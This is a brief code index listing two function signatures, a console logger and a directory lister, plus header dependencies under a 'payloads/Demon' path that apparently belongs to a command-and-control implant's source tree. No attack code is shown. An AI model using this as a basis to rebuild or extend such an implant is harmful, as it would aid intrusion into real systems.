  - `LogToConsole` (function, line 1434) `VOID LogToConsole(
    IN LPCSTR fmt,
    ...)`
  - `listDir` (function, line 1478) `PROOT_DIR listDir(
    IN LPWSTR StartPath,
    IN BOOL   SubDirs,
    IN BOOL   FilesOnly,
    I...`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/common/Macros.h`, `payloads/Demon/include/common/Native.h`, `payloads/Demon/include/core/MiniStd.h`, `payloads/Demon/include/core/Package.h`, `payloads/Demon/include/core/Syscalls.h`, `payloads/Demon/include/core/Win32.h`
